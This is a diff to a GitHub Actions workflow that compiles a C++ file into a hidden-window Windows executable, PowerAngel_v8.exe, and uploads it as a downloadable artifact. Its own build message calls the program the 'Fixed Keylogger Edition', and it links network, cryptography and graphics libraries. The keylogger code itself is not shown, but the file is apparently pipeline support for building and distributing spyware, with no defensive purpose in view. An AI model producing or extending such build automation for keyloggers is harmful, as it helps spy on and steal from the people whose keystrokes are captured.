@@ -14,4 +14,21 @@ jobs:
     - uses: actions/checkout@v4
     
     - name: Setup MSVC
-      uses
+      uses: ilammy/msvc-dev-cmd@v1
+      
+    - name: Compile Power Angel v8.0
+      shell: cmd
+      run: |
+        echo Building Power Angel v8.0 - Fixed Keylogger Edition...
+        cl /EHsc /O2 /MT AngelSmartMichael.cpp /link /SUBSYSTEM:WINDOWS /OUT:PowerAngel_v8.exe user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib gdiplus.lib shell32.lib comctl32.lib ole32.lib oleaut32.lib uuid.lib
+        if %ERRORLEVEL% NEQ 0 exit /b %ERRORLEVEL%
+        echo.
+        echo ✅ PowerAngel_v8.exe created!
+        dir PowerAngel_v8.exe
+        
+    - name: Upload PowerAngel_v8.exe
+      uses: actions/upload-artifact@v4
+      with:
+        name: 👼 PowerAngel-v8.0-Windows-x64
+        path: PowerAngel_v8.exe
+        retention-days: 90
